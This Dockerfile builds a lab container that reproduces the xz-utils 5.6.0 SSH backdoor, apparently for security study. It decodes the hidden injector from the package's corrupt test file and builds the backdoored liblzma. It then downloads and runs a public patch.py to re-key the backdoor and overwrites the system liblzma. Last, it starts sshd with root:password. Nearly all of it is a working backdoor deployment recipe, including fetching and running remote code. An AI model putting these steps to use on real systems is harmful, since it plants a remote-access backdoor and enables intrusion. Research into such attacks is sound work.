# 1. Force amd64 architecture for binary compatibility with the payload
FROM --platform=linux/amd64 debian:bookworm

# 2. Install dependencies (Including pwntools for patching)
RUN apt-get update && apt-get install -y \
    build-essential autoconf automake libtool gettext pkg-config \
    openssh-server python3 python3-pip git wget xz-utils procps gdb golang \
    && rm -rf /var/lib/apt/lists/*

WORKDIR /build

# 3. Download XZ 5.6.0 (The primary target for the amlweems/patch.py script)
RUN wget https://github.com/thesamesam/xz-archive/raw/refs/heads/main/5.6/xz-5.6.0.tar.gz && \
    tar -xzf xz-5.6.0.tar.gz

WORKDIR /build/xz-5.6.0

# 4. Generate the clean Makefiles
RUN ./configure --build=x86_64-pc-linux-gnu --host=x86_64-pc-linux-gnu

# 5. Native Malware Injection
# Tricking the attacker's script into thinking it is in a Debian build environment
RUN cat tests/files/bad-3-corrupt_lzma2.xz | tr "\t \-_" " \t_\-" | xz -dc > injector.sh && \
    sed -i 's/.*exit 0.*/# bypassed/g' injector.sh && \
    mkdir debian && touch debian/rules && \
    bash injector.sh

# 6. Build the backdoored library
RUN make -j$(nproc)

# 7. Cryptographic Hijack & System Deployment
WORKDIR /build/xzbot
RUN pip3 install --break-system-packages cryptography pwntools && \
    wget https://github.com/amlweems/xzbot/raw/refs/heads/main/patch.py -O patch.py && \
    # Run the patcher against the freshly built library
    python3 patch.py /build/xz-5.6.0/src/liblzma/.libs/liblzma.so && \
    # Overwrite the legitimate system library with our hijacked version
    cp /build/xz-5.6.0/src/liblzma/.libs/liblzma.so.patch /lib/x86_64-linux-gnu/liblzma.so.5 && \
    chmod 644 /lib/x86_64-linux-gnu/liblzma.so.5

# 8. Setup SSHD 
RUN ssh-keygen -A && \
    mkdir -p /run/sshd && \
    echo "PasswordAuthentication yes" >> /etc/ssh/sshd_config && \
    echo "root:password" | chpasswd

# 9. Startup Script: Starts SSHD in a clean environment to ensure the backdoor triggers
RUN echo '#!/bin/bash\n\
echo "======================================================"\n\
echo "[*] liblzma status (Checking for IFUNC hook):"\n\
nm -D /lib/x86_64-linux-gnu/liblzma.so.5 | grep lzma_crc64\n\
echo "======================================================"\n\
echo "[*] Starting backdoored SSHD on port 2222..."\n\
env -i LANG=en_US.UTF-8 PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin \
/usr/sbin/sshd -D -p 2222' > /run_lab.sh && chmod +x /run_lab.sh

EXPOSE 2222
CMD ["/run_lab.sh"]
